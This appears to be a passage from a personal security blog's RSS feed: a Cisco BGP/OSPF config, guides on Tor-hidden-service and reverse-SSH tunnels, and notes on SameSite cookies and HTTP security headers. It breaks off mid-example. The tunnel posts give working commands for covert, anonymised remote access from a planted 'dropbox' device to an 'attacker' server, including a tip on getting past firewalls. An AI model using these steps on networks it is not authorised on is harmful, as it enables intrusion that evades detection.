neighbor 10.0.32.1 route-map PREF_FROM_AS2 in
neighbor 10.5.4.2 remote-as 13
neighbor 10.5.4.2 next-hop-self
neighbor 10.5.4.2 update-source loopback 1
no auto-summary
no synchronization
exit

ip route 10.5.5.0 255.255.255.252 10.5.4.2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;complete-rtb-router-configuration&quot;&gt;&lt;strong&gt;Complete RTB router configuration&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This config is ready to be copy-pasted in the router config mode.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conf t
hostname RTB
ip multicast-routing 

interface gigabitEthernet 0/1
ip address 10.5.5.2 255.255.255.252
no shut

interface gigabitEthernet 0/2
ip address 10.5.2.2 255.255.255.252
ip pim sparse-mode
no shut

interface gigabitEthernet 0/0
ip address 10.5.0.2 255.255.255.252
ip pim sparse-mode
no shut

interface loopback 1
ip address 10.5.4.2 255.255.255.255
no shut

exit

ip pim rp-address 10.5.4.3

router ospf 1
router-id 10.5.4.2
network 10.5.2.0 0.0.0.3 area 0
network 10.5.0.0 0.0.0.3 area 0
network 10.5.4.2 0.0.0.0 area 0
default-information originate always metric 200
exit

route-map PREF_FROM_AS14 permit 10
set local-preference 200
exit

router bgp 13
bgp router-id 10.5.4.2
neighbor 10.5.5.1 remote-as 14
neighbor 10.5.5.1 route-map PREF_FROM_AS14 in
neighbor 10.5.4.1 remote-as 13
neighbor 10.5.4.1 next-hop-self
neighbor 10.5.4.1 update-source loopback 1
redistribute ospf 1
aggregate-address 10.5.0.0 255.255.240.0 summary-only
no auto-summary
no synchronization
exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In the second part of this guide we will see how to set up a redundant, fault tolerant, always available link for the client and server networks. We will setup &lt;a href=&quot;https://www.cisco.com/c/en/us/support/docs/ip/hot-standby-router-protocol-hsrp/9234-hsrpguidetoc.html&quot;&gt;&lt;em&gt;Hot Standby Router Protocol&lt;/em&gt; or  &lt;strong&gt;HSRP&lt;/strong&gt;&lt;/a&gt; in both &lt;strong&gt;RTD&lt;/strong&gt; and &lt;strong&gt;RTC&lt;/strong&gt; towards the client and server networks.&lt;/p&gt;

&lt;p&gt;The remaining router configs are also listed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please feel free to make any comment! If anything is unclear, just write in the comment and I will update the post!Thanks for reading!&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 02 Jan 2019 00:00:00 +0100</pubDate>
        <link>https://carloalbertoscola.it//2019/linux/notes/network/cisco/BGP-OSPF-network-routing/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2019/linux/notes/network/cisco/BGP-OSPF-network-routing/</guid>
        
        <category>network</category>
        
        <category>routing</category>
        
        <category>cisco</category>
        
        <category>bgp</category>
        
        <category>ospf</category>
        
        <category>multicast</category>
        
        
        <category>linux</category>
        
        <category>notes</category>
        
        <category>network</category>
        
        <category>cisco</category>
        
      </item>
    
      <item>
        <title>TOR SSH Remote Reverse Tunnel - Raspberry Pi</title>
        <description>&lt;h1 id=&quot;tor-remote-reverse-ssh-tunnel&quot;&gt;Tor Remote Reverse-SSH Tunnel&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;Last modified:&lt;/em&gt; 17 January 2019&lt;/p&gt;

&lt;p&gt;How to use TOR hidden service with SSH remote tunnel and how to use  hidden service as an anonymous SSH proxy.&lt;/p&gt;

&lt;p&gt;We will set a remote ssh tunnel from a raspi client towards a hidden service, accessible by an attacker.&lt;/p&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites:&lt;/h2&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;user &lt;em&gt;pi&lt;/em&gt; on the Raspberry.&lt;/li&gt;
  &lt;li&gt;user &lt;em&gt;lobs&lt;/em&gt; on the Attacker Server.&lt;/li&gt;
  &lt;li&gt;SSH server running on both.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;TOR&lt;/strong&gt; server running on both.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;torsocks&lt;/strong&gt; installed on raspi.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Torsocks allows you to use most applications in a safe way with Tor. It ensures that DNS requests are handled safely and explicitly rejects any traffic other than TCP from the application you’re using.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;tor-hidden-service-setup&quot;&gt;TOR Hidden Service setup&lt;/h1&gt;
&lt;p&gt;On the attacker machine it is needed to setup a Hidden Service exposing itself to the whole TOR network. The service will expose the local ssh server needed to allow the raspi box to reverse ssh into it.&lt;/p&gt;

&lt;p&gt;Edit the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/tor/torrc&lt;/code&gt; file and modify these lines:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 30022 127.0.0.1:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;where 30022 is the port open to the TOR network redirecting traffic to 127.0.0.1 port 22.&lt;/p&gt;

&lt;p&gt;For further client authorization look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;HiddenServiceAuthorizeClient&lt;/code&gt; directive.&lt;/p&gt;

&lt;p&gt;Then save and restart Tor. It will create the material needed to the hidden service in the &lt;code class=&quot;highlighter-rouge&quot;&gt;hidden_service&lt;/code&gt; folder. The last thing you need is the hostname which will refer to the hidden service located under &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/tor/hidden_service/hostname&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For example: &lt;code class=&quot;highlighter-rouge&quot;&gt;irpqznciwifhpqgd.onion&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Change also the file &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/tor/torsocks.conf&lt;/code&gt; the line:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AllowOutboundLocalhost 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This is needed to torsocks&lt;/p&gt;

&lt;h1 id=&quot;from-the-raspberry&quot;&gt;From the Raspberry:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Copy the RSA key to the Server with:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
    &lt;p&gt;If id_rsa.pub doesn’t already exists then:&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh-keygen
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;The command to launch is:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ torsocks ssh -p 30022 -N -R 2222:localhost:22 pi@irpqznciwifhpqgd.onion
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will use torsocks to ssh the Raspberry to the Attacker Hidden Service without specifying any command (-N) and tell the server to redirect ssh connection from local (server) port 2222 to remote (raspberry) port 22 (or whatever you want).&lt;/p&gt;

&lt;p&gt;After that, on the Attacker Server there will be a ssh socket listening on port 2222 ready to redirect ssh traffic to tor to Raspberry through port 22.&lt;/p&gt;

&lt;p&gt;You can always set up the raspberry to serve ssh connections on port 80 or 443 in order to avoid firewall issues. It depends on the firewall configurations.&lt;/p&gt;

&lt;h1 id=&quot;the-attacker&quot;&gt;The Attacker&lt;/h1&gt;

&lt;p&gt;The attacker just need to:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;SSH into his server on port 30022.&lt;/li&gt;
  &lt;li&gt;Run the command:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -p 2222 -l lobs localhost
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The localhost listening service is automatically routing traffic to the TOR network. This means no loss of anonymity for both the client and the server.&lt;/p&gt;

&lt;p&gt;attacker &amp;lt;—&amp;gt; TOR &amp;lt;—&amp;gt; HiddenService &amp;lt;—–&amp;gt; TOR &amp;lt;—-&amp;gt; client&lt;/p&gt;

&lt;h3 id=&quot;considerations&quot;&gt;&lt;strong&gt;Considerations&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This way if the Raspberry falls under someone’s else hands it has full access on the AttackerServer. If it has served its aim then you should remove the RSA key from the authorized_key on the server or just destroy the HiddenService.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please feel free to make any comment! If anything is unclear, just write in the comment and I will update the post!Thanks for reading!&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 09 May 2018 00:00:00 +0200</pubDate>
        <link>https://carloalbertoscola.it//2018/linux/security/tor-ssh-reverse-tunnel/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/linux/security/tor-ssh-reverse-tunnel/</guid>
        
        
        <category>linux</category>
        
        <category>security</category>
        
      </item>
    
      <item>
        <title>SOCKS PROXY on Reverse SSH tunnel</title>
        <description>&lt;h1 id=&quot;socks-proxy-through-ssh-reverse-tunnel&quot;&gt;SOCKS Proxy through SSH REVERSE TUNNEL&lt;/h1&gt;
&lt;h2 id=&quot;using-only-ssh&quot;&gt;Using only SSH&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Last modified:&lt;/em&gt; 17 January 2019&lt;/p&gt;

&lt;p&gt;How to set up a SOCKS proxy with SSH reverse tunnel. The tunnel will be ssh-encrypted and each traffic will pass through the tunnel, like in a VPN.
&lt;img src=&quot;/assets/socks-ssh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usually you may need to have an encrypted SOCKS proxy on a network you trust in order to be able to use it whenever you are on a network you &lt;strong&gt;don’t trust&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;In order to do this you just need to have &lt;strong&gt;ssh server&lt;/strong&gt; active on your remote server, and then just setup a local SOCKS proxy which will redirect traffic through the ssh tunnel.&lt;/p&gt;

&lt;p&gt;This is done with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -D 127.0.0.1:12345 -l &amp;lt;remoteuser&amp;gt; -p &amp;lt;remoteSSHServerport&amp;gt; serveruser@domain
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Where:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-D&lt;/code&gt; tells ssh to create a local SOCKS PROXY&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and SSH will do the rest.&lt;/p&gt;

&lt;h1 id=&quot;i-want-to-do-the-opposite&quot;&gt;I want to do the opposite&lt;/h1&gt;
&lt;h2 id=&quot;what-if-the-server-is-a-dropbox-behind-a-secure-network&quot;&gt;What if the server is a dropbox behind a secure network?&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;The dropbox need to connect to the server.&lt;/li&gt;
  &lt;li&gt;The server can setup a SOCKS PROXY&lt;/li&gt;
  &lt;li&gt;The proxy will redirect traffic through the secure channel&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;From the dropbox (assume ssh certificate is already copied):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -N -R 2222:localhost:22 serveruser@serverdomain
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Where:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-N&lt;/code&gt; tells ssh that there will be no commands sent&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-R [bind_address:]port:host:hostport&lt;/code&gt; enable port forward generating a listening socket on port 2222 on the remote server and redirecting it to the local one on port 22&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the server:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -D 127.0.0.1:12345 -l &amp;lt;dropboxuser&amp;gt; -p 2222 localhost
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now you can set the proxy on your browser (for example) and packets will be routed to the dropbox.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please feel free to make any comment! If anything is unclear, just write in the comment and I will update the post!Thanks for reading!&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 02 May 2018 00:00:00 +0200</pubDate>
        <link>https://carloalbertoscola.it//2018/security/linux/socks-proxy-on-ssh-tunnel/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/security/linux/socks-proxy-on-ssh-tunnel/</guid>
        
        
        <category>security</category>
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>SameSite cookie security</title>
        <description>&lt;h1 id=&quot;samesite-and-xssi&quot;&gt;SameSite and XSSI&lt;/h1&gt;

&lt;p&gt;What is here:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;http-equiv&lt;/li&gt;
  &lt;li&gt;SameSite cookie&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;short-review-of-meta-http-equiv&quot;&gt;Short review of &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;meta http-equiv&lt;/code&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;meta http-equiv=&quot;&amp;lt;&amp;gt;&quot; content=&quot;&amp;lt;&amp;gt;&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The http-equiv attribute provides an &lt;strong&gt;HTTP heade&lt;/strong&gt;r for the information/value of the &lt;a href=&quot;https://www.w3schools.com/tags/att_meta_content.asp&quot;&gt;content&lt;/a&gt; attribute.&lt;/p&gt;

&lt;p&gt;The http-equiv attribute can be used to simulate an HTTP response header.&lt;/p&gt;

&lt;p&gt;So, basically, using a HTML directive like:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;meta http-equiv=&quot;set-cookie&quot; content=&quot;id=12345; SameSite=Strict&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;is equivalent to:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-Cookie: id=12345; SameSite=Strict;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;sent by the server.&lt;/p&gt;

&lt;h1 id=&quot;samesite-cookie&quot;&gt;&lt;strong&gt;SameSite cookie&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;The aims of this cookie attribute are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;prevent cross origin timing attacks:&lt;/p&gt;

    &lt;p&gt;( &lt;a href=&quot;https://aaltodoc.aalto.fi/handle/123456789/23955&quot;&gt;https://aaltodoc.aalto.fi/handle/123456789/23955&lt;/a&gt; and &lt;a href=&quot;https://www.sjoerdlangkemper.nl/2016/04/21/combining-csrf-with-timing-attacks/&quot;&gt;https://www.sjoerdlangkemper.nl/2016/04/21/combining-csrf-with-timing-attacks/&lt;/a&gt;)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;prevent cross origin script inclusion (XSSI):&lt;/p&gt;

    &lt;p&gt;“XSSI is a fancy way of saying: you are including in your program, someone elses code; You don’t have any control over what is in that code, and you don’t have any control over the security of the server on which it is hosted.&lt;/p&gt;

    &lt;script type=&quot;text/javascript&quot; src=&quot;http://mymatedave.com/js/coolwidget.js&quot;&gt;&lt;/script&gt;

    &lt;p&gt;That script will run in my webapp with the same level of trust as any of my own javascript code. It will have access to the the full page content and DOM, it will be able to read all my app’s cookies and read the users keypresses and mouse movements, and everything else that javascript can do.&lt;/p&gt;

    &lt;p&gt;If my mate dave, then decides to put something malicious in his cool widget (say, a sniffer/keylogger that sends all the user’s cookies, form data and keypresses to his server) then I won’t necessarily know. Also, the security of my app now depends on the security of dave’s server. If dave’s server gets compromised and coolwidget.js is replaced by the attacker, i again won’t necessarily know and the malicious code will run as part of my app. “(&lt;a href=&quot;https://stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi&quot;&gt;https://stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi&lt;/a&gt;)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;prevent CSRF: SameSite cookies are only sent if the site the request originated from is in the same origin as the target site (in strict mode for GET and POST, in lax mode only for POST requests).&lt;/p&gt;

    &lt;p&gt;NOTE: The cookies are, as also with cross-site request forgery (CSRF), included when requesting a resource from a different host.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SameSite cookie flag can be &lt;strong&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strict&lt;/code&gt;&lt;/em&gt;&lt;/strong&gt; or &lt;strong&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lax:&lt;/code&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;strict:&lt;/strong&gt; will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context. A bank website however most likely doesn’t want to allow any transactional pages to be linked from external sites so the strict flag would be most appropriate here. It can affect negatively the user experience, if a user click on a FB profile page on a site diverse than &lt;a href=&quot;http://facebook.com&quot;&gt;facebook.com&lt;/a&gt; he will see error 404.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;lax&lt;/strong&gt;: the browser is sending the cookie if the user clicks on a &lt;strong&gt;top level URL&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;HTTP Headers:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-Cookie: CookieName=CookieValue; SameSite=Lax;
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Let’s make some examples:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/same-site-cookie-diagram-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Many times the browser will send some requests cross origin when the page is loaded, could it be advertisements, tracking, analitycs, Facebook like buttons and so more. Along with these requests, the cookies present in the victim browser that belong to that domains will also be sent.&lt;/p&gt;

&lt;p&gt;This is how &lt;strong&gt;Third-Party&lt;/strong&gt; can track their users.&lt;/p&gt;

&lt;p&gt;With &lt;em&gt;SameSite&lt;/em&gt; &lt;strong&gt;&lt;em&gt;lax&lt;/em&gt;&lt;/strong&gt; only &lt;strong&gt;TOP LEVEL NAVIGATION&lt;/strong&gt; allow requests to include cookies.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/same-site-cookie-diagram-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Basically, they don’t change the URL in your address bar. Because these GET requests do not cause a TOP LEVEL navigation, thus cookies set to Lax won’t be sent with them.&lt;/p&gt;

&lt;p&gt;Should i use GET or POST?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;When the parameters are carried by GET, they stay in the browser history. They also will be placed in server logs and the Referrer header in the request made toward third parties.&lt;/li&gt;
  &lt;li&gt;Another reason for not using GET requests is that cookies set to Lax are still sent along with GET requests, giving attackers another opportunity to exploit users.&lt;/li&gt;
  &lt;li&gt;Lastly, exploiting a CSRF vulnerability by using GET is much easier. To exploit a CSRF vulnerability in a form using GET, an attacker does not have to own a site. He can inject this payload into a forum message, post comment or image tag.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;GOOD reference for SameSite explanation&lt;/strong&gt; → &lt;a href=&quot;https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/&quot;&gt;https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;problems-with-samesite&quot;&gt;Problems with SameSite&lt;/h2&gt;

&lt;p&gt;Blocking all third party cookies could make the browser experience very poor.&lt;/p&gt;

&lt;p&gt;From &lt;a href=&quot;https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-1.1&quot;&gt;https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-1.1&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		Setting the &quot;SameSite&quot; attribute in &quot;strict&quot; mode provides robust
   defense in depth against CSRF attacks, but has the potential to
   confuse users unless sites' developers carefully ensure that their
   session management systems deal reasonably well with top-level
   navigations.

	   Consider the scenario in which a user reads their email at MegaCorp
   Inc's webmail provider &quot;https://example.com/&quot;.  They might expect
   that clicking on an emailed link to &quot;https://projects.com/secret/project&quot; would show them the secret project that they're authorized
   to see, but if &quot;projects.com&quot; has marked their session cookies as
   &quot;SameSite&quot;, then this cross-site navigation won't send them along
   with the request. &quot;projects.com&quot; will render a 404 error to avoid
   leaking secret information, and the user will be quite confused.

	   Developers can avoid this confusion by adopting a session management
   system that relies on not one, but two cookies: one conceptualy
   granting &quot;read&quot; access, another granting &quot;write&quot; access.  The latter
   could be marked as &quot;SameSite&quot;, and its absence would provide a
   reauthentication step before executing any non-idempotent action.
   The former could drop the &quot;SameSite&quot; attribute entirely, or choose
   the &quot;Lax&quot; version of enforcement, in order to allow users access to
   data via top-level navigation.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Differences between XSSI and XSS? Read &lt;a href=&quot;/notes/2018/04/23/xssi-and-xss.html&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 26 Apr 2018 00:00:00 +0200</pubDate>
        <link>https://carloalbertoscola.it//2018/notes/samesite-cookie/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/notes/samesite-cookie/</guid>
        
        
        <category>notes</category>
        
      </item>
    
      <item>
        <title>HTTP Headers security</title>
        <description>&lt;h1 id=&quot;useful-http-headers&quot;&gt;Useful HTTP headers&lt;/h1&gt;
&lt;p&gt;Summary of HTTP headers useful and fundamental for securing web pages, clients, and communication from malicious activities. HSTS, CORS, CSP, HPKP and many many others.&lt;/p&gt;

&lt;h2 id=&quot;secure-cookie&quot;&gt;Secure Cookie&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-Cookie: &amp;lt;name&amp;gt;=&amp;lt;value&amp;gt;[; &amp;lt;Max-Age&amp;gt;=&amp;lt;age&amp;gt;]
              [; expires=&amp;lt;date&amp;gt;]
                [; domain=&amp;lt;domain_name&amp;gt;]
                  [; path=&amp;lt;some_path&amp;gt;]
                    [; secure][; HttpOnly]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;HttpOnly&lt;/strong&gt;: any script can’t access cookie data, an empty string is returned.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;secure&lt;/strong&gt;: the cookie will/is server only under a secure connection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Other fields are auto-esplicative&lt;/p&gt;

&lt;p&gt;The newer &lt;strong&gt;SameSite&lt;/strong&gt; cookie header is explained &lt;a href=&quot;/notes/2018/04/26/samesite-cookie.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;cors-headers&quot;&gt;CORS Headers&lt;/h2&gt;
&lt;h3 id=&quot;cross-origin-resource-sharing&quot;&gt;Cross-Origin-Resource-Sharing&lt;/h3&gt;

&lt;p&gt;Examples:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin: Server.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin: *&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Methods: POST,GET&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Headers: POST, GET, OPTIONS&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Request-Method: POST,GET&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Request-Headers: Content-Type&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When a browser send a cross-origin XMLHttpRequest to a server that &lt;strong&gt;doesn’t respond&lt;/strong&gt; with these headers, &lt;strong&gt;no access&lt;/strong&gt; will be given to the response.&lt;/p&gt;

&lt;p&gt;Let’s see an example:&lt;/p&gt;

&lt;p&gt;Suppose web content on domain http://foo.example wishes to invoke content on domain http://bar.other. Code of this sort might be used within JavaScript deployed on foo.example:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;invocation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://bar.other/resources/public-data/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;callOtherDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    
    &lt;span class=&quot;nx&quot;&gt;invocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;invocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;invocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This will lead to a simple exchange between the client and the server, using CORS headers to handle the privileges:&lt;/p&gt;

&lt;p&gt;Let us look at what the browser will send to the server in this case, and let’s see how the server responds:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /resources/public-data/ HTTP/1.1
Host: bar.other
